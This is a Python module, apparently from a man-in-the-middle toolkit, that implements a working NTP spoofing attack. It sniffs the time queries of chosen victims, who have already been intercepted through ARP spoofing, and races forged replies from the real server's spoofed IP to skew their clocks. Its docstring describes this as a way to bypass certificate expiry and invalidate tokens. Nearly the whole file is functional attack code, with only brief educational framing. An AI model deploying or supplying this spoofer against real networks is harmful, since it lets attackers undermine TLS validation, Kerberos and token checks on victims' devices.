"""
ntp_spoofer.py — Reply to NTP queries with a forged timestamp.

When MITM'd victims send NTP requests (UDP 123) to upstream time
servers, this module sniffs the request and immediately injects a
forged NTP response from the spoofed source IP of the real server.
The victim's clock is skewed by the configured ``offset_seconds``.

Why this matters in security education:

* Many security primitives (TLS certificate validation, Kerberos
  tickets, JWT expiration, HSTS) rely on a correct system clock.
* Skewing the clock backwards by years bypasses certificate expiry
  warnings; skewing it forwards invalidates tokens.
* Modern operating systems use NTP authentication / NTS in some
  configurations — those queries are not spoofable. Unauthenticated
  NTPv4 (still the default on most home / IoT devices) is.

We respond first so the victim accepts our timestamp; the real reply
arrives later and is discarded as a duplicate transaction.

RFC 5905 NTP packet (48 bytes)::

    0                   1                   2                   3
    0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |LI | VN  |Mode |    Stratum    |     Poll      |   Precision   |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                         Root Delay                            |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                       Root Dispersion                         |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |                       Reference ID                            |
   +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
   |             Reference Timestamp (64)                          |
   ...
"""

from __future__ import annotations

import collections
import socket
import struct
import threading
import time
from typing import Optional

try:
    from scapy.all import sniff, send  # type: ignore
    from scapy.layers.inet import IP, UDP  # type: ignore
    from scapy.packet import Raw  # type: ignore

    SCAPY_AVAILABLE = True
except Exception:
    SCAPY_AVAILABLE = False


NTP_PORT = 123
# Seconds between the NTP epoch (1900-01-01) and the Unix epoch (1970-01-01).
_NTP_UNIX_OFFSET = 2208988800


def _ntp_timestamp(unix_seconds: float) -> bytes:
    """Encode a Unix timestamp as an 8-byte NTP timestamp.

    32 bits seconds (since 1900) + 32 bits fractional second.
    """
    ntp = unix_seconds + _NTP_UNIX_OFFSET
    secs = int(ntp)
    frac = int((ntp - secs) * (1 << 32)) & 0xFFFFFFFF
    return struct.pack("!II", secs & 0xFFFFFFFF, frac)


def _build_ntp_response(
    request: bytes,
    spoofed_unix_seconds: float,
    stratum: int = 2,
    poll: int = 6,
    precision: int = -20,
    ref_id: bytes = b"LOCL",
) -> Optional[bytes]:
    """Build a 48-byte NTP server response from the client's request.

    Copies the client's transmit timestamp into the origin slot per
    RFC 5905 §7.3 so the request/response correlation succeeds at the
    victim.
    """
    if len(request) < 48:
        return None
    # Read the client's LI/VN/Mode byte; preserve VN, force Mode=4 (server).
    li_vn_mode = request[0]
    vn = (li_vn_mode >> 3) & 0x07
    out_li_vn_mode = (0 << 6) | (vn << 3) | 4
    # Client's transmit timestamp is bytes 40..48 — this becomes our
    # response's "origin timestamp" so the victim accepts the match.
    client_tx = request[40:48]
    ref_ts = _ntp_timestamp(spoofed_unix_seconds - 1.0)
    rx_ts = _ntp_timestamp(spoofed_unix_seconds)
    tx_ts = _ntp_timestamp(spoofed_unix_seconds + 0.001)
    return (
        bytes([out_li_vn_mode, stratum & 0xFF, poll & 0xFF, precision & 0xFF])
        + struct.pack("!I", 0)         # Root Delay  = 0
        + struct.pack("!I", 0)         # Root Disper = 0
        + ref_id[:4].ljust(4, b"\x00")  # Reference ID
        + ref_ts                       # Reference timestamp
        + client_tx                    # Origin timestamp (echoed)
        + rx_ts                        # Receive timestamp
        + tx_ts                        # Transmit timestamp
    )


class NTPSpoofer:
    """Race-the-response NTP rewriter that skews a victim's clock.

    Parameters
    ----------
    iface:
        Interface to sniff/send on.
    offset_seconds:
        How much to skew the victim's perceived time. Positive shifts
        the clock into the future, negative into the past.
    target_ips:
        Restrict spoofing to these source IPs (the MITM'd victims).
        When empty, every NTP request on the link is answered — that's
        almost never what you want, so the GUI requires explicit
        targets.
    """

    HIT_LIMIT = 500

    def __init__(
        self,
        iface: Optional[str],
        offset_seconds: float = 0.0,
        target_ips: Optional[list[str]] = None,
    ) -> None:
        self.iface = iface
        self.offset_seconds = float(offset_seconds)
        self.target_ips = set(t for t in (target_ips or []) if t)
        self._lock = threading.Lock()
        self._stop_event = threading.Event()
        self._thread: Optional[threading.Thread] = None
        self.hits: int = 0
        self.recent_hits: collections.deque = collections.deque(
            maxlen=self.HIT_LIMIT,
        )
        self.started_at: float = 0.0

    # ------------------------------------------------------------------ #

    @property
    def is_running(self) -> bool:
        return self._thread is not None and self._thread.is_alive()

    @property
    def uptime_seconds(self) -> float:
        return time.time() - self.started_at if self.started_at else 0.0

    def start(self) -> None:
        if not SCAPY_AVAILABLE:
            raise RuntimeError("Scapy is required for NTP spoofer.")
        if not self.target_ips:
            raise RuntimeError(
                "NTP spoofer needs explicit target IPs — start an "
                "ARP attack first so this targets the victims only."
            )
        if self.is_running:
            return
        self._stop_event.clear()
        self.started_at = time.time()
        self._thread = threading.Thread(target=self._sniff_loop, daemon=True)
        self._thread.start()

    def stop(self) -> None:
        self._stop_event.set()
        if self._thread:
            self._thread.join(timeout=2.0)
            self._thread = None

    def snapshot(self) -> dict:
        with self._lock:
            return {
                "running":     self.is_running,
                "uptime":      self.uptime_seconds,
                "offset":      self.offset_seconds,
                "hits":        self.hits,
                "recent_hits": list(self.recent_hits),
            }

    # ------------------------------------------------------------------ #

    def _sniff_loop(self) -> None:
        bpf_parts = [f"udp port {NTP_PORT}"]
        bpf_parts.append(
            "(" + " or ".join(f"src host {ip}" for ip in self.target_ips) + ")"
        )
        bpf = " and ".join(bpf_parts)
        try:
            sniff(
                iface=self.iface,
                filter=bpf,
                prn=self._on_packet,
                store=False,
                stop_filter=lambda _p: self._stop_event.is_set(),
            )
        except Exception:
            pass

    def _on_packet(self, packet) -> None:
        try:
            if not (packet.haslayer(IP) and packet.haslayer(UDP)
                    and packet.haslayer(Raw)):
                return
            ipl = packet[IP]
            udpl = packet[UDP]
            src_ip, dst_ip = ipl.src, ipl.dst
            sport, dport = int(udpl.sport), int(udpl.dport)
            if dport != NTP_PORT:
                return                # only outbound NTP queries
            if src_ip not in self.target_ips:
                return
            payload = bytes(packet[Raw].load)
            if len(payload) < 48:
                return
            # Only respond to client mode (3).
            li_vn_mode = payload[0]
            mode = li_vn_mode & 0x07
            if mode != 3:
                return

            spoofed = time.time() + self.offset_seconds
            response_payload = _build_ntp_response(payload, spoofed)
            if response_payload is None:
                return
            response = (
                IP(src=dst_ip, dst=src_ip)
                / UDP(sport=NTP_PORT, dport=sport)
                / Raw(load=response_payload)
            )
            send(response, iface=self.iface, verbose=0)

            with self._lock:
                self.hits += 1
                self.recent_hits.append({
                    "ts":       time.time(),
                    "victim":   src_ip,
                    "ntp_srv":  dst_ip,
                    "offset":   self.offset_seconds,
                })
        except Exception:
            pass
